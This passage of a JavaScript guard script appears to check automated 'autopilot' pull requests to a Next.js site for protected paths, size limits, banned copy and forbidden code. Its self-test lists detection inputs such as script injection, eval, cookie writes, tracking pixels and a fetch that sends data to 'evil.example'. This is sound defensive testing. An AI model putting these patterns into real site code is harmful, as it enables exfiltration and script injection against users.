  if (added.length > LIMITS.ledgerLines) v(null, `adds ${added.length} lines; at most ${LIMITS.ledgerLines} per pull request`);
  for (const entry of added) {
    if (entry.error) { v(entry.number, `line ${entry.error}`); continue; }
    for (const problem of [...ledgerEntryProblems(entry.value), ...newEntryProblems(entry.value, { branchDate, branchId, pr })]) v(entry.number, problem);
    if (typeof entry.value.id === 'string') {
      if (ids.has(entry.value.id)) v(entry.number, `id "${entry.value.id}" is already used on line ${ids.get(entry.value.id)}`);
      else ids.set(entry.value.id, entry.number);
    }
  }
}

// ---------- The check ----------

function currentBranch(cwd) {
  const out = git(cwd, ['symbolic-ref', '--short', '-q', 'HEAD'], { allowFail: true });
  return out ? out.trim() : null;
}

/**
 * Checks one change. Returns { ok, skipped, branch, base, head, mergeBase, files, changedLines, textBytes, binaryBytes,
 * violations, warnings }. Each violation or warning is { rule, file, line, message }; warnings never fail the check.
 */
function check({ cwd = process.cwd(), base, head, branch, pr = null } = {}) {
  if (!base || !head) throw new GitError('--base and --head are required');
  let name = branch || process.env.GITHUB_HEAD_REF || '';
  if (!name && head === 'HEAD') name = currentBranch(cwd) || '';
  const result = { ok: true, skipped: false, branch: name || null, base, head, pr, mergeBase: null, files: 0, changedLines: 0, textBytes: 0, binaryBytes: 0, violations: [], warnings: [] };
  if (!name.startsWith(BRANCH_PREFIX)) return { ...result, skipped: true };

  const violations = result.violations;
  const add = (rule, file, line, message) => violations.push({ rule, file, line, message });
  const branchMatch = BRANCH_NAME.exec(name);
  if (!branchMatch || name.length > BRANCH_MAX || !validDate(branchMatch[1])) add('branch-name', null, null, `"${name}" must match autopilot/YYYY-MM-DD-slug (a real date; lower-case letters, digits and single hyphens) and be at most ${BRANCH_MAX} characters`);
  const branchDate = branchMatch && validDate(branchMatch[1]) ? branchMatch[1] : null;
  const branchId = branchDate && name.length <= BRANCH_MAX ? name.slice(BRANCH_PREFIX.length) : null;

  const headSha = git(cwd, ['rev-parse', '--verify', '--quiet', `${head}^{commit}`]).trim();
  const baseSha = git(cwd, ['rev-parse', '--verify', '--quiet', `${base}^{commit}`]).trim();
  const mergeBase = git(cwd, ['merge-base', baseSha, headSha]).trim();
  result.mergeBase = mergeBase;

  const entries = changedEntries(cwd, mergeBase, headSha);
  result.files = entries.length;
  const verbs = { A: 'added', D: 'deleted', M: 'changed', R: 'renamed', C: 'copied', T: 'changed type' };
  const scanned = (file) => !isProse(file) && !protectedBy(file);
  // Lines deleted from scanned files, by trimmed text. An added line identical to one of them is existing code that
  // moved (a component split in two, functions reordered), so a pattern it already had is not reported again.
  const deletedPool = new Map();
  const pending = [];
  for (const entry of entries) {
    const verb = verbs[entry.status] || 'changed';
    for (const file of new Set([entry.oldPath, entry.newPath].filter(Boolean))) {
      const why = protectedBy(file);
      if (why) add('protected-path', file, null, `${verb}; ${why} (autopilot/CONSTITUTION.md §6)`);
    }
    if (entry.oldPath && ROUTE_FILE.test(entry.oldPath) && entry.oldPath !== entry.newPath) {
      add('route-deletion', entry.oldPath, null, entry.newPath ? `renamed to ${entry.newPath}; moving a page changes its URL (owner decision)` : 'deleted; removing a page removes its URL (owner decision)');
    }
    if (entry.newPath && entry.oldPath !== entry.newPath && SITE_JS.test(entry.newPath)) {
      add('file-type', entry.newPath, null, `${verb}; site code is TypeScript (.ts, .tsx): a JavaScript file is not type-checked and would replace a .ts or .tsx module of the same name`);
    }
    if (entry.newPath && (entry.newMode === '120000' || entry.newMode === '160000')) {
      add('file-type', entry.newPath, null, entry.newMode === '120000' ? 'symbolic links are not allowed' : 'submodules are not allowed');
      continue;
    }
    const where = entry.newPath || entry.oldPath;
    const newBlob = entry.newPath ? blob(cwd, entry.newSha) : null;
    if (MEDIA.test(where)) {
      if (!binaryAllowedAt(where)) add('binary', where, null, 'images, fonts and media may change only under public/ (not public/data/), or as a Next.js icon or share image under app/ (favicon.ico, icon, apple-icon, opengraph-image, twitter-image)');
      if (newBlob) {
        result.binaryBytes += newBlob.length;
        if (newBlob.length > LIMITS.binaryBytes) add('binary', entry.newPath, null, `${Math.round(newBlob.length / 1024)} KB; each binary file may be at most ${LIMITS.binaryBytes / 1024} KB`);
      }
      continue;
    }
    if (newBlob && !isText(newBlob)) {
      add('file-type', entry.newPath, null, `is not UTF-8 text; only ${MEDIA_TYPES.join(', ')} files may be binary`);
      continue;
    }
    const oldBlob = entry.oldPath ? blob(cwd, entry.oldSha) : null;
    if (!newBlob && oldBlob && !isText(oldBlob)) continue; // a deleted binary file
    const { added, deleted } = textChange(cwd, mergeBase, headSha, entry);
    const addedBytes = added.reduce((sum, item) => sum + Buffer.byteLength(item.text) + 1, 0);
    result.textBytes += addedBytes;
    if (where !== LEDGER) result.changedLines += added.length + deleted.length;
    if (entry.oldPath && scanned(entry.oldPath)) {
      for (const text of deleted) if (text.trim()) deletedPool.set(text.trim(), (deletedPool.get(text.trim()) || 0) + 1);
    }
    if (addedBytes > LIMITS.textBytes) add('size', where, null, `adds ${Math.round(addedBytes / 1024)} KB of text; at most ${LIMITS.textBytes / 1024} KB per file`);
    if (!entry.newPath || isProse(entry.newPath)) continue;
    if (!entry.newPath.startsWith('public/')) {
      const long = added.find((item) => item.text.length > LIMITS.lineLength);
      if (long) add('size', entry.newPath, long.line, `a line of ${long.text.length} characters; at most ${LIMITS.lineLength} (no minified or inlined blobs)`);
    }
    // A file moved here from a path that was never scanned (documentation, or somewhere off limits) is read in full.
    const movedIn = entry.oldPath && entry.oldPath !== entry.newPath && !scanned(entry.oldPath);
    pending.push({ file: entry.newPath, lines: movedIn ? allLines(newBlob.toString('utf8')) : added, movedIn });
  }
  for (const { file, lines, movedIn } of pending) {
    const moved = new Set();
    if (!movedIn) {
      for (const item of lines) {
        const count = deletedPool.get(item.text.trim()) || 0;
        if (count > 0) { moved.add(item.line); deletedPool.set(item.text.trim(), count - 1); }
      }
    }
    const blocks = addedBlocks(lines);
    scan(file, blocks, FORBIDDEN, 'forbidden-pattern', violations, moved);
    if (MARKUP_FILE.test(file)) scan(file, blocks, FORBIDDEN_MARKUP, 'forbidden-pattern', violations, moved);
    scanUrls(file, blocks, violations, moved);
    scan(file, blocks, BANNED, 'banned-copy', violations, moved);
  }
  if (result.binaryBytes > LIMITS.binaryTotalBytes) add('size', null, null, `binary files total ${(result.binaryBytes / 1024 / 1024).toFixed(2)} MB; at most ${LIMITS.binaryTotalBytes / 1024 / 1024} MB`);
  if (result.textBytes > LIMITS.textTotalBytes) add('size', null, null, `adds ${(result.textBytes / 1024 / 1024).toFixed(2)} MB of text; at most ${LIMITS.textTotalBytes / 1024 / 1024} MB`);
  if (entries.length > LIMITS.files) add('size', null, null, `${entries.length} changed files; at most ${LIMITS.files}`);
  if (result.changedLines > LIMITS.lines) add('size', null, null, `${result.changedLines} changed lines (added + deleted, not counting ${LEDGER}); at most ${LIMITS.lines}`);

  const layout = showFile(cwd, headSha, 'app/layout.tsx');
  const layoutBefore = showFile(cwd, mergeBase, 'app/layout.tsx');
  if (layout === null) add('required-content', 'app/layout.tsx', null, 'is missing');
  else {
    if (!rendersTag(layout, 'SiteAnalytics')) add('required-content', 'app/layout.tsx', null, 'must still render <SiteAnalytics /> (outside comments and conditions)');
    if (layoutBefore !== null && rendersTag(layoutBefore, 'ExperimentHead') && !rendersTag(layout, 'ExperimentHead')) add('required-content', 'app/layout.tsx', null, 'must still render <ExperimentHead />');
  }

  const bookkeeping = entries.length > 0 && entries.every((entry) => [entry.oldPath, entry.newPath].filter(Boolean).every((file) => BOOKKEEPING.includes(file)));
  checkLedger(showFile(cwd, mergeBase, LEDGER), showFile(cwd, headSha, LEDGER), { violations, warnings: result.warnings, branchDate, branchId, pr, bookkeeping });

  // The guard reads commits. Run on HEAD with work not yet committed, it would check (and pass) something else.
  if (head === 'HEAD') {
    const status = git(cwd, ['status', '--porcelain=v1', '-z'], { allowFail: true });
    const items = [];
    if (status) {
      const tokens = status.split('\0').filter(Boolean);
      for (let i = 0; i < tokens.length; i += 1) {
        items.push({ code: tokens[i].slice(0, 2), file: tokens[i].slice(3) });
        if (/^[RC]/.test(tokens[i])) i += 1; // a rename or copy is followed by its old path
      }
    }
    const tracked = items.filter((item) => item.code !== '??');
    const untracked = items.filter((item) => item.code === '??');
    const some = (list) => `${list.slice(0, 3).map((item) => item.file).join(', ')}${list.length > 3 ? ', …' : ''}`;
    if (tracked.length) add('uncommitted', null, null, `${tracked.length} changed file${tracked.length === 1 ? ' is' : 's are'} not committed (${some(tracked)}); the guard checks commits, not the working tree: commit, then run it again`);
    if (untracked.length) result.warnings.push({ rule: 'uncommitted', file: null, line: null, message: `${untracked.length} untracked file${untracked.length === 1 ? ' is' : 's are'} not checked (${some(untracked)}); commit ${untracked.length === 1 ? 'it' : 'them'} if ${untracked.length === 1 ? 'it belongs' : 'they belong'} to the change` });
  }
  result.ok = violations.length === 0;
  return result;
}

function report(result) {
  if (result.skipped) return `autopilot-guard: ${result.branch ? `"${result.branch}" is` : 'this is'} not an autopilot branch; nothing to check`;
  const lines = [`autopilot-guard: ${result.branch}: ${result.files} changed files, ${result.changedLines} changed lines, ${Math.round(result.textBytes / 1024)} KB of added text, ${Math.round(result.binaryBytes / 1024)} KB of binary files (${result.base}...${result.head}, merge base ${String(result.mergeBase).slice(0, 7)})`];
  const list = (items) => items.map((v) => `  ${v.rule.padEnd(17)} ${v.file ? `${v.file}${v.line ? `:${v.line}` : ''}  ` : ''}${v.message}`);
  if (result.ok) lines.push('PASS: nothing an autopilot pull request may not change');
  else {
    lines.push(`FAIL: ${result.violations.length} violation${result.violations.length === 1 ? '' : 's'}`, ...list(result.violations));
    lines.push('Rules: autopilot/CONSTITUTION.md and docs/AUTOPILOT.md. A change that needs any of this goes to an autopilot:needs-owner issue.');
  }
  if (result.warnings.length) lines.push(`Warnings (not failures): ${result.warnings.length}`, ...list(result.warnings));
  return lines.join('\n');
}

// ---------- Self-test ----------

function selfTest() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'autopilot-guard-'));
  const run = (...args) => execFileSync('git', ['-c', 'user.name=Self Test', '-c', 'user.email=self-test@example.invalid', '-c', 'commit.gpgsign=false', ...args], { cwd: dir, stdio: ['ignore', 'pipe', 'pipe'], encoding: 'utf8' });
  const write = (file, content) => { fs.mkdirSync(path.dirname(path.join(dir, file)), { recursive: true }); fs.writeFileSync(path.join(dir, file), content); };
  const remove = (file) => fs.rmSync(path.join(dir, file), { force: true });
  const entry = (id, extra = {}) => JSON.stringify({ id, date: id.slice(0, 10), kind: 'change', title: 'A change', hypothesis: 'Clearer copy helps.', primary_metric: 'engaged_visit_rate', guardrails: ['bounce'], baseline: { rate: 0.4, n: 120 }, decision_rule: 'Keep if the rate rises.', evaluate_after: '2026-10-28', status: 'proposed', pr: null, verdict: null, result: null, ...extra });
  const CHANGE_ID = '2026-10-14-test';
  const proposal = (extra = {}) => entry(CHANGE_ID, extra);
  const FIRST = { status: 'shipped', pr: 60 };
  const BASE_LEDGER = `${entry('2026-10-01-first', FIRST)}\n`;
  const STORE = "export function read() {\n  try { return window.localStorage.getItem('units'); } catch { return null; }\n}\nexport function other() {\n  return 1;\n}\n";
  const TICKER = '/**\n * Advances the clock once a frame.\n */\nexport function tick() {\n  return 1;\n}\n';
  const LAYOUT = "import SiteAnalytics from '@/components/SiteAnalytics';\nexport default function RootLayout({ children }) {\n  return <html><body>{children}<SiteAnalytics /></body></html>;\n}\n";
  const failures = [];
  let cases = 0;
  try {
    run('init', '-q', '-b', 'main');
    write('app/layout.tsx', LAYOUT);
    write('app/page.tsx', 'export default function Home() { return <h1>Pace Notes</h1>; }\n');
    write('app/tools/page.tsx', 'export default function Tools() { return <h1>Tools</h1>; }\n');
    write('app/robots.ts', 'export default function robots() { return { rules: [] }; }\n');
    write('app/not-found.tsx', 'export default function NotFound() { return <h1>Not found</h1>; }\n');
    write('components/Card.tsx', 'export function Card() {\n  return <div>Card</div>;\n}\n');
    write('components/Store.tsx', STORE);
    write('components/Ticker.tsx', TICKER);
    write('lib/analytics.ts', 'export const on = true;\n');
    write('docs/NOTES.md', '# Notes\n');
    write('docs/snippet.md', STORE);
    write('README.md', '# Pace Notes\n');
    write('public/og/card.png', Buffer.concat([Buffer.from('\x89PNG\r\n\x1a\n', 'binary'), Buffer.alloc(64)]));
    write(LEDGER, BASE_LEDGER);
    run('add', '-A'); run('commit', '-q', '-m', 'base');

    const expect = (label, { branch = 'autopilot/2026-10-14-test', base = 'main', ledger = true, pr = null, setup, dirty, rules = [], messages = [], absent = [], warned = [] }) => {
      cases += 1;
      run('checkout', '-q', '-f', base);
      run('clean', '-q', '-fdx');
      run('checkout', '-q', '-B', `case-${cases}`);
      if (ledger) fs.appendFileSync(path.join(dir, LEDGER), `${proposal()}\n`);
      setup();
      run('add', '-A');
      run('commit', '-q', '--allow-empty', '-m', label);
      if (dirty) dirty();
      let result;
      try { result = check({ cwd: dir, base, head: 'HEAD', branch, pr }); } catch (error) { failures.push(`${label}: threw ${error.message}`); return; }
      const got = [...new Set(result.violations.map((v) => v.rule))].sort();
      const want = [...new Set(rules)].sort();
      if (JSON.stringify(got) !== JSON.stringify(want)) failures.push(`${label}: expected [${want.join(', ') || 'pass'}], got [${got.join(', ') || 'pass'}]${result.violations.length ? `: ${result.violations.map((v) => `${v.rule} ${v.file || ''}:${v.line || ''} ${v.message}`).join(' | ')}` : ''}`);
      for (const text of messages) if (!result.violations.some((v) => `${v.file}:${v.line} ${v.message}`.includes(text))) failures.push(`${label}: no violation mentions "${text}"`);
      for (const text of absent) if (result.violations.some((v) => `${v.file}:${v.line} ${v.message}`.includes(text))) failures.push(`${label}: a violation mentions "${text}"`);
      for (const text of warned) if (!result.warnings.some((v) => `${v.file}:${v.line} ${v.message}`.includes(text))) failures.push(`${label}: no warning mentions "${text}"`);
      return result;
    };
    const component = (code) => `export function Card() {\n  ${code}\n  return <div>Card</div>;\n}\n`;

    // Branches
    const skipped = expect('non-autopilot branch passes without checks', { branch: 'feature/anything', ledger: false, setup: () => write('lib/analytics.ts', 'export const on = false;\n') });
    if (skipped && !skipped.skipped) failures.push('non-autopilot branch: not reported as skipped');
    expect('a well-formed change passes', { setup: () => write('components/Card.tsx', 'export function Card() {\n  return <div>Better card</div>;\n}\n') });
    expect('branch without a date', { branch: 'autopilot/home-hero', setup: () => {}, rules: ['branch-name'] });
    expect('branch with an impossible date', { branch: 'autopilot/2026-13-14-home', setup: () => {}, rules: ['branch-name'] });
    expect('branch with capitals', { branch: 'autopilot/2026-10-14-Home', setup: () => {}, rules: ['branch-name'] });
    expect('branch with a double hyphen', { branch: 'autopilot/2026-10-14-home--hero', setup: () => {}, rules: ['branch-name'] });
    expect('branch over 80 characters', { branch: `autopilot/2026-10-14-${'a'.repeat(60)}`, setup: () => {}, rules: ['branch-name'] });

    // Protected paths: change, add, delete, rename out of and into
    expect('protected file changed', { setup: () => write('lib/analytics.ts', 'export const on = false;\n'), rules: ['protected-path'], messages: ['lib/analytics.ts'] });
    expect('protected folder file added', { setup: () => write('scripts/new.cjs', 'console.log(1);\n'), rules: ['protected-path'] });
    expect('workflow added', { setup: () => write('.github/workflows/x.yml', 'on: push\n'), rules: ['protected-path'] });
    expect('protected file deleted', { setup: () => remove('lib/analytics.ts'), rules: ['protected-path'] });
    expect('protected file renamed out', { setup: () => { remove('lib/analytics.ts'); write('lib/stats.ts', 'export const on = true;\n'); }, rules: ['protected-path'], messages: ['lib/analytics.ts'] });
    expect('file renamed into a protected folder', { setup: () => { remove('components/Card.tsx'); write('scripts/Card.tsx', 'export function Card() {\n  return <div>Card</div>;\n}\n'); }, rules: ['protected-path'], messages: ['scripts/Card.tsx'] });
    for (const file of ['public/data/x.json', 'analysis/release.json', 'app/privacy/page.tsx', 'app/error.tsx', 'app/global-error.tsx', 'app/tools/error.tsx', 'app/tools/not-found.tsx', 'components/ExperimentVariant.tsx', 'next.config.mjs', 'LICENSE', 'package.json', 'lib/package.json', 'autopilot/CONSTITUTION.md', '.claude/skills/x/SKILL.md', 'CLAUDE.md', 'docs/ANALYTICS.md', 'docs/AUTOPILOT.md', 'docs/PROJECT_HANDOFF.md', 'docs/evidence/x/audit.md']) {
      expect(`protected ${file}`, { setup: () => write(file, '{}\n'), rules: ['protected-path'] });
    }
    expect('protected app/not-found.tsx changed', { setup: () => write('app/not-found.tsx', 'export default function NotFound() { return <h1>Lost?</h1>; }\n'), rules: ['protected-path'] });
    // Outside the allowed folders: root files, dotfiles anywhere, new top-level folders, non-Markdown docs, other autopilot files.
    for (const file of ['.env.production', 'postcss.config.js', '.postcssrc.json', '.babelrc', 'babel.config.json', '.vercelignore', 'middleware.ts', 'README.md', 'src/app/page.tsx', 'utils/x.ts', 'public/.well-known/x.txt', 'components/.eslintrc.json', 'docs/x.json', 'docs/widget.tsx', 'autopilot/visit.ts', 'autopilot/notes.md']) {
      expect(`off limits ${file}`, { setup: () => write(file, 'export const x = 1;\n'), rules: ['protected-path'] });
    }
    // Shadowing: webpack resolves .js and .mjs before .ts, so a sibling would replace a protected module.
    expect('JavaScript sibling of a protected module', { setup: () => write('lib/analytics-policy.js', "export * from './analytics-policy.ts';\nexport function sanitizeAnalyticsEvent(event) { return event; }\n"), rules: ['file-type', 'protected-path'], messages: ['lib/analytics-policy.js'] });
    expect('.mjs sibling of a protected component', { setup: () => write('components/SiteAnalytics.mjs', 'export default function SiteAnalytics() { return null; }\n'), rules: ['file-type', 'protected-path'] });
    expect('a new JavaScript file in site code', { setup: () => write('lib/helper.jsx', 'export const x = 1;\n'), rules: ['file-type'] });
    expect('a TypeScript helper next to a protected module is fine', { setup: () => write('lib/analytics-labels.ts', "export const LABEL = 'Visits';\n") });
    expect('the experiment registry may change', { setup: () => write('lib/experiments.ts', "export const EXPERIMENTS = [];\n") });

    // Routes
    expect('page deleted', { setup: () => remove('app/tools/page.tsx'), rules: ['route-deletion'] });
    expect('page renamed', { setup: () => { remove('app/tools/page.tsx'); write('app/kit/page.tsx', 'export default function Tools() { return <h1>Tools</h1>; }\n'); }, rules: ['route-deletion'] });
    expect('robots route deleted', { setup: () => remove('app/robots.ts'), rules: ['route-deletion'] });
    expect('page added', { setup: () => write('app/guide/page.tsx', 'export default function Guide() { return <h1>Guide</h1>; }\n') });

    // Required content
    expect('SiteAnalytics removed', { setup: () => write('app/layout.tsx', LAYOUT.replace('<SiteAnalytics />', '')), rules: ['required-content'] });
    expect('SiteAnalytics commented out', { setup: () => write('app/layout.tsx', LAYOUT.replace('<SiteAnalytics />', '{/* <SiteAnalytics /> */}')), rules: ['required-content'] });
    expect('SiteAnalytics only in a trailing comment', { setup: () => write('app/layout.tsx', LAYOUT.replace('{children}<SiteAnalytics /></body></html>;', '{children}</body></html>; // <SiteAnalytics /> moved later')), rules: ['required-content'] });
    expect('SiteAnalytics behind false &&', { setup: () => write('app/layout.tsx', LAYOUT.replace('<SiteAnalytics />', '{false && <SiteAnalytics />}')), rules: ['required-content'] });
    expect('ExperimentHead absent on base and head', { setup: () => write('app/layout.tsx', LAYOUT.replace('<html>', '<html lang="en">')) });
    run('checkout', '-q', '-f', 'main'); run('checkout', '-q', '-B', 'main-exp');
    write('app/layout.tsx', LAYOUT.replace('<html>', '<html><head><ExperimentHead /></head>'));
    run('add', '-A'); run('commit', '-q', '-m', 'experiments');
    expect('ExperimentHead kept', { base: 'main-exp', setup: () => write('components/Card.tsx', 'export const x = 1;\n') });
    expect('ExperimentHead removed', { base: 'main-exp', setup: () => write('app/layout.tsx', LAYOUT), rules: ['required-content'], messages: ['ExperimentHead'] });

    // Forbidden patterns: each on its own, in a component
    const FORBIDDEN_CASES = [
      ['<script', '<script>alert(1)</script>'], ['next/script', "import Script from 'next/script';"], ['dangerouslySetInnerHTML', '<div dangerouslySetInnerHTML={{ __html: x }} />'],
      ['HTML injection', 'el.innerHTML = text;'], ['eval(', 'eval(code);'], ['new Function(', 'const f = new Function("return 1");'],
      ['document.cookie', 'document.cookie = "a=1";'], ['browser storage', 'window.localStorage.setItem("k", v);'], ['browser storage', 'sessionStorage.getItem("k");'],
      ['browser storage', 'indexedDB.open("db");'], ['navigator.sendBeacon', 'navigator.sendBeacon("/x", body);'], ['XMLHttpRequest', 'new XMLHttpRequest();'],
      ['new WebSocket', 'new WebSocket("wss://x");'], ['EventSource(', 'new EventSource("/x");'], ['PostHog', "import posthog from 'posthog-js';"], ['PostHog', '// PostHog sees this'],
      ['<iframe', '<iframe title="x" />'], ['<iframe', '<object data="/x.pdf" />'], ['<base', '<base href="/" />'], ['javascript: URL', '<a href="javascript:void(0)">x</a>'],
      ['fetch( of an absolute URL', "fetch('https://api.example.com/x');"], ['fetch( of an absolute URL', 'fetch(`//cdn.example.com/x`)'], ['fetch( of an absolute URL', "fetch(new Request('https://api.example.com/x'));"],
      ['import( of an http(s) URL', "import('https://cdn.example.com/x.js');"], ['src=/srcSet= of an absolute URL', '<img src="https://images.example.com/a.png" alt="" />'],
      ['src=/srcSet= of an absolute URL', '<img srcSet={"https://images.example.com/a.png 2x"} alt="" />'], ['src=/srcSet= of an absolute URL', '<img srcSet="/a.png 1x, https://cdn.example.com/a@2x.png 2x" alt="" />'],
      ['url( of an absolute URL', "const bg = { backgroundImage: 'url(https://images.example.com/a.png)' };"],
      ['@import of an http(s) URL', "@import 'https://fonts.example.com/a.css';"], ['<link>/<image>/<use> of an absolute URL', '<link rel="preconnect" href="https://fonts.example.com" />'],
      ['RTCPeerConnection', 'new RTCPeerConnection();'], ['service worker', "navigator.serviceWorker.register('/sw.js');"],
      ['a custom error boundary', 'static getDerivedStateFromError() { return { failed: true }; }'], ['a custom error boundary', 'componentDidCatch(error) { this.setState({ error }); }'],
    ];
    for (const [name, code] of FORBIDDEN_CASES) {
      expect(`forbidden ${name}: ${code}`, { setup: () => write('components/Card.tsx', component(code)), rules: ['forbidden-pattern'], messages: [`components/Card.tsx:2 ${name}`] });
    }
    // Addresses on other hosts in constants, data and templates, which a later line loads.
    const ANOTHER_HOST = [
      "const HERO = 'https://images.example.com/hero.jpg';",
      "const LOGOS = [{ logo: 'https://upload.wikimedia.org/a.svg' }];",
      "const CDN = 'https://cdn.example.com';",
      "const FONT = '//fonts.example.com/a.css';",
      "export const metadata = { icons: { icon: 'https://cdn.example.com/icon.png' } };",
      "const API = `https://api.example.com/v1`;",
      '<Image loader={() => `https://cdn.example.com/x.png`} src="/x.png" alt="" />',
      "img.setAttribute('src', 'https://pixel.example.com/p.gif');",
      "const set = 'image-set(\"https://cdn.example.com/a.png\" 1x)';",
      "const repo = 'https://github.com/someone-else/x/raw/main/a.png';",
    ];
    for (const code of ANOTHER_HOST) expect(`another host: ${code}`, { setup: () => write('components/Card.tsx', component(code)), rules: ['forbidden-pattern'], messages: ['components/Card.tsx:2 an address on another host'] });
    // Comment markers inside strings do not hide the code after them.
    for (const code of ["const OPEN = '/*', PIXEL = 'https://pixel.example.net/p.gif', CLOSE = '*/';", "const PIXEL = [' //', 'https://pixel.example.net/p.gif'][1];"]) {
      expect(`a comment marker in a string: ${code}`, { setup: () => write('components/Card.tsx', component(code)), rules: ['forbidden-pattern'], messages: ['components/Card.tsx:2 an address on another host (pixel.example.net)'] });
    }
    for (const code of ['const PIXEL = `https://${HOST}/p.gif`;', "const PIXEL = 'https://' + HOST + '/p.gif';"]) {
      expect(`a computed host: ${code}`, { setup: () => write('components/Card.tsx', component(code)), rules: ['forbidden-pattern'], messages: ['components/Card.tsx:2 an address whose host is computed'] });
    }
    expect('forbidden pattern split over lines', { setup: () => write('components/Card.tsx', 'export function Card() {\n  return <link\n    rel="stylesheet"\n    href="https://fonts.example.com/a.css" />;\n}\n'), rules: ['forbidden-pattern'], messages: ['components/Card.tsx:2'] });
    expect('forbidden pattern in a CSS file', { setup: () => write('app/x.css', '.a { background: url("//images.example.com/a.png"); }\n'), rules: ['forbidden-pattern'] });
    expect('forbidden pattern in an SVG under public', { setup: () => write('public/x.svg', '<svg><script>alert(1)</script></svg>\n'), rules: ['forbidden-pattern'] });
    expect('inline event handler in public HTML', { setup: () => write('public/landing.html', '<img src="/a.png" onerror="go()">\n'), rules: ['forbidden-pattern'], messages: ['inline event handler'] });
    expect('a public worker that sends data elsewhere', { setup: () => write('public/w.js', "fetch('https://evil.example/?' + self.name);\n"), rules: ['forbidden-pattern'] });
    expect('Markdown under public is scanned', { setup: () => write('public/notes.md', 'Runners hit the wall. Your chance of finishing.\n'), rules: ['banned-copy'] });
    expect('a file moved from docs into a component is read in full', { setup: () => { remove('docs/snippet.md'); write('components/Snippet.tsx', STORE); }, rules: ['forbidden-pattern'], messages: ['components/Snippet.tsx:2 browser storage'] });
    expect('allowed: links, local fetch, local images', { setup: () => write('components/Card.tsx', 'export function Card() {\n  fetch(\'/data/x.json\');\n  return <a href="https://doi.org/10.1371/journal.pone.0251513"><img src="/og/card.png" alt="" /></a>;\n}\n') });
    expect('allowed: links in data, next/link, identifiers and notes', {
      setup: () => write('components/Card.tsx', [
        "import Link from 'next/link';",
        "const SOURCES = [{ label: 'Ely (2007)', url: 'https://experts.umn.edu/en/publications/x' }, { name: 'Weather', href: 'https://open-meteo.com/en/docs' }];",
        "const LD = { '@context': 'https://schema.org', url: `https://splithappens.run/` };",
        "const RELEASES = 'https://github.com/koolkam00/htw-live-study/releases';",
        '// Layout shift as defined at https://web.dev/articles/cls',
        'export function Card() {',
        '  const url = new URL(path, \'https://splithappens.run\');',
        '  return <svg xmlns="http://www.w3.org/2000/svg"><Link href="https://doi.org/10.1371/journal.pone.0251513">Published method</Link><Frame title="Pace" /><Embed /></svg>;',
        '}',
        '',
      ].join('\n')),
    });
    // Ordinary code and copy that only looks like a rule.
    expect('allowed: type arguments named object', { setup: () => write('lib/chart-types.ts', "const rows: Array<object> = [];\nconst cache = new WeakMap<object, string>();\nexport function useRow(useState: <T>(v: T) => [T, (v: T) => void]) { return useState<object | null>(null); }\nexport { rows, cache };\n") });
    expect('<object split over lines is still a tag', { setup: () => write('components/Card.tsx', 'export function Card() {\n  return <object\n    data="/x.pdf" />;\n}\n'), rules: ['forbidden-pattern'], messages: ['<object'] });
    expect('allowed: "JavaScript:" in copy', { setup: () => write('components/Card.tsx', component('const note = <noscript>This chart needs JavaScript: turn it on to see it.</noscript>;')) });
    expect("allowed: the URL constructor with the site's own address", { setup: () => write('components/Card.tsx', component("const url = new URL('https://splithappens.run' + path);")) });
    expect('allowed: "the wall clock"', { setup: () => write('components/Card.tsx', component('const gun = <p>Gun time is what the wall clock over the finish showed.</p>;')) });
    expect('allowed: the release-tag prefix in a data loader', { setup: () => write('lib/pack-data.ts', "export const inputId = (tag: string) => tag.replace('private-export-', 'private-');\n") });
    expect('allowed: namespaces in an exported SVG', { setup: () => write('public/art/badge.svg', '<svg xmlns="http://www.w3.org/2000/svg" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape" xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd"><path d="M0 0h1"/></svg>\n') });
    expect('allowed: JSON-LD identifiers', { setup: () => write('components/Card.tsx', component("const LD = { '@type': 'Dataset', license: 'https://creativecommons.org/licenses/by/4.0/', '@id': 'https://splithappens.run/#dataset', sameAs: 'https://www.wikidata.org/wiki/Q1' };")) });
    expect("allowed: the owner's GitHub profile", { setup: () => write('components/Card.tsx', component("const PROFILE = 'https://github.com/koolkam00';")) });
    expect('allowed: a computed address in a link', { setup: () => write('components/Card.tsx', component('const go = <a href={`https://${host}/x`}>x</a>;')) });
    expect('allowed: a line added inside an existing JSDoc comment', { setup: () => write('components/Ticker.tsx', TICKER.replace(' * Advances the clock once a frame.\n', ' * Advances the clock once a frame.\n * Frame budget: https://web.dev/articles/rendering-performance\n')) });
    expect('allowed: words in docs and the backlog', { setup: () => { write('docs/NOTES.md', 'PostHog, localStorage and the wall, written in docs.\n'); write('autopilot/backlog.md', 'Check posthog funnels; avoid "arithmetic".\n'); } });
    expect('only added lines are scanned', { setup: () => write('components/Store.tsx', STORE.replace('return 1;', 'return 2;')) });
    expect('a scanned file renamed within site code keeps its old lines unscanned', { setup: () => { remove('components/Store.tsx'); write('components/Saved.tsx', STORE); } });
    const [READ, OTHER] = [STORE.slice(0, STORE.indexOf('export function other')), STORE.slice(STORE.indexOf('export function other'))];
    expect('existing code moved to a new file is not reported again', { setup: () => { write('components/Store.tsx', OTHER); write('components/store-read.ts', READ); } });
    expect('a moved line that is edited is reported', { setup: () => { write('components/Store.tsx', OTHER); write('components/store-read.ts', READ.replace("'units'", "'unit-pref'")); }, rules: ['forbidden-pattern'], messages: ['components/store-read.ts:2 browser storage'] });
    expect('a line copied, not moved, is reported', { setup: () => write('components/store-read.ts', READ), rules: ['forbidden-pattern'], messages: ['components/store-read.ts:2 browser storage'] });

    // Banned copy
    for (const [label, text] of [['arithmetic', 'Simple arithmetic.'], ['the wall', 'Runners hit the wall.'], ['the wall', 'Before the  wall'], ['your chance', 'Your chance of finishing'], ['private-export', 'From private-export-20260912-0934'], ['20260912', 'Built 20260912']]) {
      expect(`banned ${label}`, { setup: () => write('components/Card.tsx', `export function Card() {\n  return <p>${text}</p>;\n}\n`), rules: ['banned-copy'] });
    }

    // Size, binaries and text
    expect('61 changed files', { setup: () => { for (let i = 0; i < 60; i += 1) write(`components/gen/F${i}.tsx`, `export const f${i} = ${i};\n`); }, rules: ['size'], messages: ['61 changed files'] });
    expect('60 changed files', { setup: () => { for (let i = 0; i < 59; i += 1) write(`components/gen/F${i}.tsx`, `export const f${i} = ${i};\n`); } });
    expect('1,501 changed lines', { setup: () => write('components/Long.tsx', Array.from({ length: 1501 }, (_, i) => `export const v${i} = ${i};`).join('\n') + '\n'), rules: ['size'], messages: ['1501 changed lines'] });
